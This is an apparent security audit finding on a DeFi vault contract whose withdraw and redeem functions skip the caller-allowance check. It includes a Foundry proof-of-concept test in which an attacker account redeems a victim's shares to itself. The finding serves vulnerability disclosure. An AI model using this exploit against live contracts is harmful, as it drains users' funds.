  "body": "## Finding description and impact\n\n### Root Cause\n\nThe `WERC7575Vault` contract fails to implement standard access control checks for the `withdraw` and `redeem` functions.\n\nIn a standard ERC4626 implementation, if the caller (`msg.sender`) is not the owner of the shares (`owner`), the vault must check and decrease the allowance that the owner has granted to the caller (`allowance[owner][msg.sender]`).\n\nHowever, the `_withdraw` function in `WERC7575Vault.sol` only calls `_shareToken.spendSelfAllowance(owner, shares)`. This function specifically checks and decrements `allowance[owner][owner]`. While this enforces the protocol's requirement that users must have a \"self-allowance\" (platform permission) to move funds, it **completely ignores** the relationship between the caller and the owner.\n\n```\n    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n        if (receiver == address(0)) {\n            revert IERC20Errors.ERC20InvalidReceiver(address(0));\n        }\n        if (owner == address(0)) {\n            revert IERC20Errors.ERC20InvalidSender(address(0));\n        }\n        if (assets == 0) revert ZeroAssets();\n        if (shares == 0) revert ZeroShares();\n\n        _shareToken.spendSelfAllowance(owner, shares);\n        _shareToken.burn(owner, shares);\n        SafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n    }\n```\n\n### Impact\n\nThis vulnerability allows **arbitrary theft of funds** from any user who has set up their account for normal operation.\n\nAccording to the project documentation (`USE_CASE_CONTEXT.md` and `KNOWN_ISSUES.md`), users are **required** to set a \"Self-Allowance\" via `permit` to perform transfers or withdrawals. This means valid users will almost always satisfy the `spendSelfAllowance` check.\n\nAn attacker can call `vault.redeem(shares, attackerAddress, victimAddress)`.\n\n1. The vault checks if the victim has self-allowance (`spendSelfAllowance`). This passes because the victim is a legitimate user.\n2. The vault **fails** to check if the attacker has allowance from the victim.\n3. The vault burns the victim's shares.\n4. The vault transfers the underlying assets to the attacker.\n\nThis is a critical severity issue as it leads to direct and unrestricted loss of user funds.\n\n## Recommended mitigation steps\n\nModify `_withdraw` in `src/WERC7575Vault.sol` to enforce dual authorization: maintain the self-allowance check (platform permission) but **add** the standard ERC20 allowance check for third-party callers.",
  "proof_of_concept": "The following test case demonstrates the exploit. Valid `user1` sets up their account as required by the protocol. Malicious `user2` steals their funds without permission.\n\nAdd this to `test/WERC7575.t.sol` and run with `forge test --match-test testExploit_Critical_StealFunds_FromSelfAllowedUser -vvvv`.\n\n```solidity\n    function testExploit_Critical_StealFunds_FromSelfAllowedUser() public {\n        // --- 1. Preparation Phase: Victim (user1) holds shares ---\n        // Simulate user1 depositing to get shares (user1 already has token in setUp)\n        vm.startPrank(user1);\n        token.approve(address(vault), AMOUNT);\n        vault.deposit(AMOUNT, user1);\n        vm.stopPrank();\n\n        // Verify victim's initial state\n        assertEq(shareToken.balanceOf(user1), AMOUNT, \"Victim should have shares\");\n        \n        // --- 2. Prerequisite: Victim sets Self-Allowance (Essential business step) ---\n        // Construct Permit signature to get Self-Allowance\n        uint256 deadline = block.timestamp + 3600;\n        bytes32 structHash = keccak256(\n            abi.encode(\n                keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"), \n                user1, \n                user1, // Spender is user1 themselves (Self-Allowance)\n                AMOUNT, \n                shareToken.nonces(user1), \n                deadline\n            )\n        );\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, digest);\n\n        // Victim executes Permit\n        vm.prank(user1);\n        shareToken.permit(user1, user1, AMOUNT, deadline, v, r, s);\n\n        // Confirm victim has Self-Allowance (Prerequisite for normal system usage)\n        assertEq(shareToken.allowance(user1, user1), AMOUNT);\n\n        // --- 3. Attack Phase: Attacker (user2) steals funds ---\n        // Record attacker's initial balance\n        uint256 attackerBalanceBefore = token.balanceOf(user2);\n\n        // Switch to attacker's perspective\n        vm.startPrank(user2);\n        \n        // Attacker attempts to redeem victim's shares\n        // Params: shares=AMOUNT, receiver=user2 (attacker), owner=user1 (victim)\n        // Expected behavior: Should revert because user2 has no allowance from user1\n        // Actual behavior: Success, because Vault wrongly used user1's Self-Allowance to pass the check\n        vault.redeem(AMOUNT, user2, user1);\n        \n        vm.stopPrank();\n\n        // --- 4. Verify Result: Funds stolen ---\n        // Victim's shares zeroed out\n        assertEq(shareToken.balanceOf(user1), 0, \"Victim shares were burned unauthorizedly\");\n        \n        // Attacker received underlying assets\n        assertEq(token.balanceOf(user2), attackerBalanceBefore + AMOUNT, \"Attacker successfully stole the funds\");\n    }\n```",
